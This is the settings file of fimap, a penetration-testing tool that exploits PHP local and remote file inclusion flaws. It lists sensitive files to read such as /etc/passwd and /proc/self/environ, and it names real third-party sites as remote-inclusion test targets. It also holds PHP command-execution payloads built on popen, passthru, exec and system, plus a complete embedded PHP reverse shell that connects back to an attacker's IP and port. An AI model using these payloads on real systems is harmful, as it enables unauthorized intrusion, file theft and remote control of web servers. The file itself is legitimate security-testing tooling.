#
# This file is part of fimap.
#
# Copyright(c) 2009 Iman Karim(ikarim2s@smail.inf.fh-brs.de).
# http://fimap.googlecode.com
#
# This file may be licensed under the terms of of the
# GNU General Public License Version 2 (the ``GPL'').
#
# Software distributed under the License is distributed
# on an ``AS IS'' basis, WITHOUT WARRANTY OF ANY KIND, either
# express or implied. See the GPL for the specific language
# governing rights and limitations.
#
# You should have received a copy of the GPL along with this
# program. If not, go to http://www.gnu.org/licenses/gpl.html
# or write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
#



__author__="Iman Karim(ikarim2s@smail.inf.fh-brs.de)"
__date__ ="$01.09.2009 13:56:47$"

settings = {}

settings["dynamic_rfi"] = {}

settings["dynamic_rfi"]["mode"] = "off" # Set to "ftp" or "local" to use Dynamic_RFI. Set it to "off" to disable it and rely on settings["filesrmt"] files.

# FTP Mode
settings["dynamic_rfi"]["ftp"] = {}
settings["dynamic_rfi"]["ftp"]["ftp_host"] = None
settings["dynamic_rfi"]["ftp"]["ftp_user"] = None
settings["dynamic_rfi"]["ftp"]["ftp_pass"] = None
settings["dynamic_rfi"]["ftp"]["ftp_path"] = None # A non existing file without suffix. Example: /home/imax/public_html/payload
settings["dynamic_rfi"]["ftp"]["http_map"] = None # The mapped HTTP path of the file. Example: http://tha-imax.de/~imax/payload
                                                  # For best results make sure that no file in this directory will be interpreted!

# Local Mode
settings["dynamic_rfi"]["local"] = {}
settings["dynamic_rfi"]["local"]["local_path"] = None # A non existing file on your filesystem without prefix which is reachable by http. Example: /var/www/payload
settings["dynamic_rfi"]["local"]["http_map"] = None   # The http url of the file without prefix where the file is reachable from the web. Example: http://localhost/payload
                                                      # Note that localhost will only work if you are testing local sites. You should define your internet ip - but i believe
                                                      # if you are using this tool you already know it ;)




# Files you want to scan for.
# There are 3 types of files you can define:
# - "files"     are the default files which can be reached relative.
#               Example: /etc/passwd
# - "filesabs"  are absolute only filepathes. Those which can't be reached in a relative way.
#               Example: php://input
# - "filesrmt"  are remote files to check them.
#
# All files you define should be defined in arrays. The first item should
# be the filepath itself. The second one should be a string which is in the file.
# The thrid option is a string of flags. The following flags can be used:
# (r)ead ; e(x)ecute ; executable by User-(A)gent ; executable by (P)ost ; (R)emote executable
# Example Array 1 : ("/etc/passwd", "root:", "r")
#                                             # [0] Check the file "/etc/passwd".
#                                             # [1] The file should contain "root:".
#                                             # [2] The file is (r)eadonly -> for testing only.
# Example Array 2 : ("php://input", None, "rxP")
#                                             # [0] Check the file "php://input".
#                                             # [1] Ignore string check and rely on error messages.
#                                             # [2] The file is (r)eadable and injectable\e(x)ecutable by (P)OST.
# Example Array 3 : ("/proc/self/environ", "HTTP_USER_AGENT=", "rxA")
#                                             # [0] Check the file "/proc/self/environ".
#                                             # [1] The file should contain "HTTP_USER_AGENT=".
#                                             # [2] The file is (r)eadable and injectable\e(x)ecutable by User-(A)gent.
#
# If NULL-Byte Poisoning is possible, fimap will automaticly try to modify the path for you.
# If it's not available, fimap will try those files which have the same ending characters like the forced suffix
#
# All files here should be defined as absolute files. fimap will automaticly relative them if needed.
settings["files"] = (
                        ("/etc/passwd", "root:", "r"),
                        ("/proc/self/environ", "HTTP_USER_AGENT=", "rxA"),
                    )

                     # Possible more files...
                     #"/var/log/secure",
                     #"/var/log/messages",
                     #"/var/log/auth",
                     #"/var/log/apache/auth.log",
                     #"/var/log/apache/auth_log",
                     #"/var/log/apache2/auth.log",
                     #"/var/log/apache2/auth_log",
                     #"/var/log/apache/error.log",
                     #"/var/log/apache/error_log",
                     #"/var/log/apache2/error.log",
                     #"/var/log/apache2/error_log",
                     #"/var/log/httpd/error.log",
                     #"/var/log/httpd/error_log"
                     #)

# Files which can't be relativized. These pathes can only work if we have a
# clean injection.
# Works also if:
#   - Is dirty but has working NullByte-Injection
#   - If the appendix of the include vector has the same ending as our file.
# In both cases it have to be an absolute path.
# fimap will check every case for you.
settings["filesabs"] = (("php://input", None, "rxP"),)

# Remote file inclusion test.
settings["filesrmt"] = (
                          (     # Test for remote inclusion and for dirty urls with suffix .php
                                "http://www.phpbb.de/index.php", 
                                "Willkommen auf phpBB.de",
                                "rR" # (r)ead-flag and (R)emoteInjection-Flag
                          ),
                          (     # Same as above for urls with suffix .html
                                "http://www.uni-bonn.de/Frauengeschichte/index.html",
                                "Frauengeschichte an der Universit",
                                "rR" # (r)ead-flag and (R)emoteInjection-Flag
                          ),
                          (
                                # ... .htm
                                "http://www.kah-bonn.de/index.htm?presse/winterthur.htm",
                                "Das Programm der Kunst- und Ausstellungshalle basiert",
                                "rR" # (r)ead-flag and (R)emoteInjection-Flag
                          )
                       )


# Distribution files which can give us infos about the distribution.
settings["distfiles"]= ("/etc/debian_version", "/etc/redhat-release")

# CMD to test if PHP injection works and a string which should be found if it was successfull.
settings["php_info"] = ("<? phpinfo(); ?>", "HTTP_USER_AGENT </td><td class=\"v\">")

# Shell test. The command which should be executed and the result of it to test if the php_exec stuff below works.
settings["shell_test"] = ("printf %d 0xDEADBEEF", "3735928559")

# PHP Execution Methods. Methods to execute system commands on the exploitable system. 
# In best case it should echo all stuff back to us.
# __PAYLOAD__ will be replaces by the actual command.
settings["php_exec"]=[]
settings["php_exec"].append(("popen","<? $h=popen(\"__PAYLOAD__\", \"r\");while(!feof($h)){$l=fread($h, 2024);echo $l;}?>"))
settings["php_exec"].append(("passthru", "<? passthru (\"__PAYLOAD__\"); ?>"))
settings["php_exec"].append(("exec", "<? exec (\"__PAYLOAD__\"); ?>"))
settings["php_exec"].append(("system", "<? system (\"__PAYLOAD__\"); ?>"))

# Reverse Shell Code - I have enlighted it.
# __IP__ will be replaced with the IP.
# __PORT__ will be replaced with the port.
# Orginal credit goes to:
# php-reverse-shell - A Reverse Shell implementation in PHP
# Copyright (C) 2007 pentestmonkey@pentestmonkey.net
settings["reverse_shell_code"] = "<?php set_time_limit (0);$VERSION = \"1.0\";$ip = \"__IP__\";$port = __PORT__;$chunk_size = 1400;$write_a = null;$error_a = null;$shell = \"uname -a; w; id; /bin/sh -i\";$daemon = 0;$debug = 0;if (function_exists(\"pcntl_fork\")) { $pid = pcntl_fork();if ($pid == -1) { printit(\"ERROR: Cant fork\");exit(1);} if ($pid) { exit(0);} if (posix_setsid() == -1) { printit(\"Error: Cant setsid()\");exit(1);} $daemon = 1;} else {printit(\"WARNING: Failed to daemonise.This is quite common and not fatal.\");}chdir(\"/\");umask(0);$sock = fsockopen($ip, $port, $errno, $errstr, 30);if (!$sock) { printit(\"$errstr ($errno)\");exit(1);}$descriptorspec = array( 0 => array(\"pipe\", \"r\"), 1 => array(\"pipe\", \"w\"), 2 => array(\"pipe\", \"w\"));$process = proc_open($shell, $descriptorspec, $pipes);if (!is_resource($process)) {printit(\"ERROR: Cant spawn shell\"); exit(1);}stream_set_blocking($pipes[0], 0);stream_set_blocking($pipes[1], 0);stream_set_blocking($pipes[2], 0);stream_set_blocking($sock, 0);printit(\"Successfully opened reverse shell to $ip:$port\");while (1) {if (feof($sock)) {printit(\"ERROR: Shell connection terminated\");break;} if (feof($pipes[1])) {printit(\"ERROR: Shell process terminated\"); break;} $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);if (in_array($sock, $read_a)) { if ($debug) printit(\"SOCK READ\"); $input = fread($sock, $chunk_size); if ($debug) printit(\"SOCK: $input\");fwrite($pipes[0], $input);} if (in_array($pipes[1], $read_a)) { if ($debug) printit(\"STDOUT READ\"); $input = fread($pipes[1], $chunk_size); if ($debug) printit(\"STDOUT: $input\");fwrite($sock, $input);} if (in_array($pipes[2], $read_a)) { if ($debug) printit(\"STDERR READ\"); $input = fread($pipes[2], $chunk_size); if ($debug) printit(\"STDERR: $input\");fwrite($sock, $input);}}fclose($sock);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process);function printit ($string) { if (!$daemon) { print \"$string\n\";}}?>"

